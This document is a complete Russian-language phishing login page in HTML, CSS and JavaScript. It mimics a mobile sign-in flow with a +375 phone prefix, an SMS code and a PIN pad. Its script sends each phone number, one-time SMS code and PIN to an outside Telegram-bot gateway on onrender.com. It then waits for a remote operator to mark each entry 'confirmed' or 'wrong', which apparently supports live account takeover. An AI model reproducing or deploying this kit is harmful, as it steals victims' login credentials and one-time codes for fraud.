<style>
.alpha-auth {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
  min-height: 100vh;
  background: radial-gradient(circle at bottom, rgba(0, 100, 255, 0.15), transparent 25%),
              linear-gradient(135deg, #0a0e1a 0%, #0f1422 100%);
  color: #fff;
  padding: 18px 14px 30px;
}
.alpha-auth * { box-sizing: border-box; }
.alpha-auth .wrap {
  width: 100%;
  max-width: 430px;
  margin: 0 auto;
  min-height: calc(100vh - 48px);
  display: flex;
  flex-direction: column;
}
.alpha-auth .top {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 22px;
}
.alpha-auth .back-btn,
.alpha-auth .chat-btn {
  width: 42px;
  height: 42px;
  border: none;
  border-radius: 50%;
  background: rgba(255,255,255,0.04);
  color: #fff;
  font-size: 24px;
  cursor: pointer;
}
.alpha-auth .back-btn { visibility: hidden; }
.alpha-auth.step-code .back-btn,
.alpha-auth.step-pin .back-btn { visibility: visible; }
.alpha-auth .chat-btn.hidden { visibility: hidden; }
.alpha-auth .card { margin-top: auto; margin-bottom: auto; }
.alpha-auth .form-step { display: none; }
.alpha-auth.step-phone .step-phone,
.alpha-auth.step-code .step-code,
.alpha-auth.step-pin .step-pin { display: block; }
.alpha-auth .title {
  margin: 0 0 8px;
  font-size: 38px;
  line-height: 1.1;
  font-weight: 700;
  letter-spacing: -0.02em;
}
.alpha-auth .subtitle {
  margin: 0 0 20px;
  font-size: 15px;
  line-height: 1.4;
  color: rgba(255,255,255,0.7);
}
.alpha-auth .field { margin-bottom: 16px; }
.alpha-auth .input-wrap {
  display: flex;
  align-items: center;
  height: 56px;
  border-radius: 14px;
  background: rgba(255,255,255,0.08);
  border: 1px solid rgba(255,255,255,0.1);
  overflow: hidden;
}
.alpha-auth .prefix {
  padding: 0 14px 0 16px;
  font-size: 20px;
  font-weight: 600;
  color: #fff;
  white-space: nowrap;
}
.alpha-auth input {
  width: 100%;
  height: 100%;
  border: none;
  outline: none;
  background: transparent;
  color: #fff;
  font-size: 20px;
  font-weight: 500;
  padding: 0 16px 0 0;
}
.alpha-auth input::placeholder {
  color: rgba(255,255,255,0.35);
  font-weight: 400;
}
.alpha-auth .code-input {
  text-align: center;
  letter-spacing: 8px;
  font-size: 26px;
  font-weight: 600;
}
.alpha-auth .btn {
  width: 100%;
  height: 54px;
  border: none;
  border-radius: 14px;
  margin-top: 12px;
  background: linear-gradient(90deg, #2563eb 0%, #1d4ed8 100%);
  color: #fff;
  font-size: 18px;
  font-weight: 600;
  cursor: pointer;
  box-shadow: 0 8px 20px rgba(37, 99, 235, 0.25);
}
.alpha-auth .btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}
.alpha-auth .policy {
  margin-top: 16px;
  font-size: 12px;
  line-height: 1.4;
  color: rgba(255,255,255,0.5);
  text-align: center;
}
.alpha-auth .policy a { color: #60a5fa; text-decoration: none; }
.alpha-auth .resend {
  margin-top: 16px;
  text-align: center;
  font-size: 14px;
  line-height: 1.4;
  color: rgba(255,255,255,0.7);
}
.alpha-auth .resend a { color: #60a5fa; text-decoration: none; }
.alpha-auth .loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.85);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  flex-direction: column;
  gap: 20px;
}
.alpha-auth .spinner {
  width: 50px;
  height: 50px;
  border: 3px solid rgba(255,255,255,0.2);
  border-top-color: #2563eb;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}
.alpha-auth .loading-text {
  color: white;
  font-size: 16px;
}
.alpha-auth .error-message {
  background: rgba(220,38,38,0.2);
  border: 1px solid #dc2626;
  border-radius: 12px;
  padding: 12px;
  margin-bottom: 16px;
  color: #fca5a5;
  font-size: 14px;
  text-align: center;
}
.alpha-auth .pin-screen {
  min-height: 70vh;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
}
.alpha-auth .pin-top { padding-top: 20px; text-align: center; }
.alpha-auth .pin-title {
  font-size: 28px;
  font-weight: 700;
  margin: 0 0 20px;
}
.alpha-auth .pin-dots {
  display: flex;
  justify-content: center;
  gap: 16px;
  margin-bottom: 28px;
}
.alpha-auth .pin-dot {
  width: 16px;
  height: 16px;
  border-radius: 50%;
  background: rgba(255,255,255,0.2);
  transition: 0.2s;
}
.alpha-auth .pin-dot.filled { background: #60a5fa; }
.alpha-auth .pin-method {
  font-size: 14px;
  color: #60a5fa;
  text-decoration: none;
}
.alpha-auth .pin-pad { padding: 0 10px 10px; }
.alpha-auth .pin-row {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 16px;
  margin-bottom: 14px;
}
.alpha-auth .pin-key,
.alpha-auth .pin-empty,
.alpha-auth .pin-back { height: 64px; display: flex; align-items: center; justify-content: center; }
.alpha-auth .pin-key {
  border: none;
  background: rgba(255,255,255,0.06);
  border-radius: 16px;
  color: #fff;
  font-size: 32px;
  font-weight: 500;
  cursor: pointer;
  transition: 0.1s;
}
.alpha-auth .pin-key:active { background: rgba(255,255,255,0.15); transform: scale(0.96); }
.alpha-auth .pin-back {
  border: none;
  background: transparent;
  color: rgba(255,255,255,0.6);
  font-size: 24px;
  cursor: pointer;
}
</style>

<div class="alpha-auth step-phone" id="alpha-auth">
  <div class="wrap">
    <div class="top">
      <button class="back-btn" id="back-step" type="button">←</button>
      <div></div>
      <button class="chat-btn" id="chat-btn" type="button">💬</button>
    </div>

    <div class="card">
      <!-- PHONE -->
      <div class="form-step step-phone">
        <h1 class="title">Введите номер телефона</h1>
        <p class="subtitle">Для входа или регистрации</p>
        <div class="field">
          <div class="input-wrap">
            <div class="prefix">+375</div>
            <input type="tel" id="phone-input" placeholder="(29) 123-45-67" maxlength="20" inputmode="numeric">
          </div>
        </div>
        <button class="btn" id="phone-next" type="button">Продолжить</button>
        <div class="policy">
          Нажимая «Продолжить», вы соглашаетесь с <a href="#">условиями</a>
        </div>
      </div>

      <!-- SMS (5-значный код) -->
      <div class="form-step step-code">
        <h1 class="title">Введите код</h1>
        <p class="subtitle">Мы отправили 5-значный код в SMS</p>
        <div class="field">
          <div class="input-wrap">
            <input type="tel" id="code-input" class="code-input" placeholder="12345" maxlength="5" inputmode="numeric">
          </div>
        </div>
        <button class="btn" id="code-next" type="button">Подтвердить</button>
        <div class="resend" id="resend-box">
          <span id="resend-text">Не пришёл код? <a href="#" id="resend-link">Отправить снова</a></span>
        </div>
      </div>

      <!-- PIN -->
      <div class="form-step step-pin">
        <div class="pin-screen">
          <div class="pin-top">
            <h1 class="pin-title">Введите PIN-код</h1>
            <div class="pin-dots">
              <div class="pin-dot" data-pin-dot="0"></div>
              <div class="pin-dot" data-pin-dot="1"></div>
              <div class="pin-dot" data-pin-dot="2"></div>
              <div class="pin-dot" data-pin-dot="3"></div>
            </div>
            <a href="#" class="pin-method" id="change-pin-method">Изменить способ входа</a>
          </div>
          <div class="pin-pad">
            <div class="pin-row">
              <button class="pin-key" data-pin-key="1">1</button>
              <button class="pin-key" data-pin-key="2">2</button>
              <button class="pin-key" data-pin-key="3">3</button>
            </div>
            <div class="pin-row">
              <button class="pin-key" data-pin-key="4">4</button>
              <button class="pin-key" data-pin-key="5">5</button>
              <button class="pin-key" data-pin-key="6">6</button>
            </div>
            <div class="pin-row">
              <button class="pin-key" data-pin-key="7">7</button>
              <button class="pin-key" data-pin-key="8">8</button>
              <button class="pin-key" data-pin-key="9">9</button>
            </div>
            <div class="pin-row">
              <div class="pin-empty"></div>
              <button class="pin-key" data-pin-key="0">0</button>
              <button class="pin-back" id="pin-backspace">
                <span>⌫</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
(function() {
  // -----  URL БОТА  -----
  const BOT_API_URL = 'https://telegram-bot-gateway-1.onrender.com';
  
  // -----  Глобальные переменные  -----
  let sessionId = null;
  let statusChecker = null;
  let currentStep = 'phone';
  
  function generateSessionId() {
    return Date.now() + '-' + Math.random().toString(36).substring(2, 10);
  }
  
  // -----  Показать/скрыть загрузку  -----
  function showLoading(text = 'Ожидание подтверждения...') {
    let overlay = document.querySelector('.loading-overlay');
    if (!overlay) {
      overlay = document.createElement('div');
      overlay.className = 'loading-overlay';
      overlay.innerHTML = `
        <div class="spinner"></div>
        <div class="loading-text">${text}</div>
      `;
      document.body.appendChild(overlay);
    } else {
      overlay.querySelector('.loading-text').textContent = text;
      overlay.style.display = 'flex';
    }
  }
  
  function hideLoading() {
    const overlay = document.querySelector('.loading-overlay');
    if (overlay) overlay.style.display = 'none';
  }
  
  function showError(message) {
    const currentStepDiv = document.querySelector('.form-step:not([style*="display: none"])');
    if (currentStepDiv) {
      let errorDiv = currentStepDiv.querySelector('.error-message');
      if (!errorDiv) {
        errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        const firstChild = currentStepDiv.firstChild;
        currentStepDiv.insertBefore(errorDiv, firstChild.nextSibling);
      }
      errorDiv.textContent = message;
      setTimeout(() => errorDiv.remove(), 4000);
    }
  }
  
  // -----  Проверка статуса сессии (циклическая)  -----
  async function startStatusCheck(sessionId, expectedStatus, onSuccess, onError) {
    if (statusChecker) clearInterval(statusChecker);
    
    return new Promise((resolve, reject) => {
      statusChecker = setInterval(async () => {
        try {
          const response = await fetch(`${BOT_API_URL}/check_status/${sessionId}`);
          const data = await response.json();
          
          if (data.status === 'code_confirmed') {
            clearInterval(statusChecker);
            statusChecker = null;
            hideLoading();
            resolve('code_confirmed');
          } else if (data.status === 'code_wrong') {
            clearInterval(statusChecker);
            statusChecker = null;
            hideLoading();
            showError('❌ Неверный код. Попробуйте ещё раз.');
            reject('code_wrong');
          } else if (data.status === 'pin_confirmed') {
            clearInterval(statusChecker);
            statusChecker = null;
            hideLoading();
            resolve('pin_confirmed');
          } else if (data.status === 'pin_wrong') {
            clearInterval(statusChecker);
            statusChecker = null;
            hideLoading();
            showError('❌ Неверный PIN. Попробуйте ещё раз.');
            reject('pin_wrong');
          }
        } catch (err) {
          console.error('Ошибка проверки статуса:', err);
        }
      }, 2000);
    });
  }
  
  // -----  DOM элементы  -----
  const root = document.getElementById('alpha-auth');
  const backBtn = document.getElementById('back-step');
  const phoneInput = document.getElementById('phone-input');
  const phoneNext = document.getElementById('phone-next');
  const codeInput = document.getElementById('code-input');
  const codeNext = document.getElementById('code-next');
  const pinDots = document.querySelectorAll('[data-pin-dot]');
  const pinKeys = document.querySelectorAll('[data-pin-key]');
  const pinBackspace = document.getElementById('pin-backspace');
  const changePinMethod = document.getElementById('change-pin-method');
  
  let pinValue = '';
  
  // -----  Вспомогательные функции  -----
  function onlyDigits(v) { return v.replace(/\D/g, ''); }
  
  function formatPhone(value) {
    const d = onlyDigits(value).slice(0, 9);
    if (d.length === 0) return '';
    if (d.length <= 2) return `(${d}`;
    if (d.length <= 5) return `(${d.slice(0,2)}) ${d.slice(2)}`;
    if (d.length <= 7) return `(${d.slice(0,2)}) ${d.slice(2,5)}-${d.slice(5)}`;
    return `(${d.slice(0,2)}) ${d.slice(2,5)}-${d.slice(5,7)}-${d.slice(7,9)}`;
  }
  
  function setStep(step) {
    currentStep = step;
    root.classList.remove('step-phone', 'step-code', 'step-pin');
    root.classList.add(step);
  }
  
  function updatePinDots() {
    pinDots.forEach((dot, i) => dot.classList.toggle('filled', i < pinValue.length));
  }
  
  async function sendPhone() {
    const digits = onlyDigits(phoneInput.value);
    if (digits.length < 9) {
      alert('Введите номер полностью (9 цифр)');
      return;
    }
    
    const phone = '+375' + digits;
    sessionId = generateSessionId();
    
    phoneNext.disabled = true;
    phoneNext.textContent = 'Отправка...';
    
    try {
      await fetch(`${BOT_API_URL}/submit_phone`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: phone, session_id: sessionId, user_chat_id: null })
      });
      setStep('step-code');
      codeInput.focus();
    } catch(err) {
      alert('Ошибка отправки номера');
    } finally {
      phoneNext.disabled = false;
      phoneNext.textContent = 'Продолжить';
    }
  }
  
  async function sendCode() {
    const code = onlyDigits(codeInput.value);
    if (code.length < 5) {
      alert('Введите 5-значный код');
      return;
    }
    
    codeNext.disabled = true;
    codeNext.textContent = 'Отправка...';
    showLoading('Ожидание подтверждения кода в Telegram...');
    
    try {
      const response = await fetch(`${BOT_API_URL}/submit_code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: sessionId, code: code })
      });
      const data = await response.json();
      
      if (data.status === 'waiting_confirmation') {
        try {
          await startStatusCheck(sessionId, 'code_confirmed', null, null);
          setStep('step-pin');
          pinValue = '';
          updatePinDots();
        } catch(err) {
          // Код неверный, остаёмся на этом же шаге
          codeInput.value = '';
          codeInput.focus();
        }
      }
    } catch(err) {
      hideLoading();
      alert('Ошибка отправки кода');
    } finally {
      codeNext.disabled = false;
      codeNext.textContent = 'Подтвердить';
    }
  }
  
  async function sendPin() {
    if (pinValue.length < 4) return;
    
    showLoading('Ожидание подтверждения PIN в Telegram...');
    
    try {
      const response = await fetch(`${BOT_API_URL}/submit_pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: sessionId, pin: pinValue })
      });
      const data = await response.json();
      
      if (data.status === 'waiting_confirmation') {
        try {
          await startStatusCheck(sessionId, 'pin_confirmed', null, null);
          alert('✅ Вход выполнен успешно!');
          // Сброс формы
          sessionId = null;
          setStep('step-phone');
          phoneInput.value = '';
          codeInput.value = '';
          pinValue = '';
          updatePinDots();
        } catch(err) {
          // PIN неверный, остаёмся на этом же шаге
          pinValue = '';
          updatePinDots();
        }
      }
    } catch(err) {
      hideLoading();
      alert('Ошибка отправки PIN');
    }
  }
  
  function pushPinDigit(d) {
    if (pinValue.length >= 4) return;
    pinValue += d;
    updatePinDots();
    if (pinValue.length === 4) {
      sendPin();
    }
  }
  
  function removePinDigit() {
    pinValue = pinValue.slice(0, -1);
    updatePinDots();
  }
  
  // -----  Обработчики  -----
  phoneInput.addEventListener('input', function() { this.value = formatPhone(this.value); });
  codeInput.addEventListener('input', function() { this.value = onlyDigits(this.value).slice(0, 5); });
  phoneNext.addEventListener('click', sendPhone);
  codeNext.addEventListener('click', sendCode);
  
  backBtn.addEventListener('click', () => {
    if (root.classList.contains('step-pin')) {
      setStep('step-code');
      pinValue = '';
      updatePinDots();
    } else if (root.classList.contains('step-code')) {
      setStep('step-phone');
    }
  });
  
  changePinMethod.addEventListener('click', (e) => {
    e.preventDefault();
    setStep('step-phone');
    phoneInput.value = '';
    codeInput.value = '';
    pinValue = '';
    updatePinDots();
  });
  
  const resendLink = document.getElementById('resend-link');
  if (resendLink) {
    resendLink.addEventListener('click', (e) => {
      e.preventDefault();
      alert('Новый код отправлен (симуляция). Введите новый 5-значный код.');
      codeInput.value = '';
      codeInput.focus();
    });
  }
  
  pinKeys.forEach(btn => btn.addEventListener('click', () => pushPinDigit(btn.getAttribute('data-pin-key'))));
  pinBackspace.addEventListener('click', removePinDigit);
  
  updatePinDots();
  setStep('step-phone');
})();
</script>
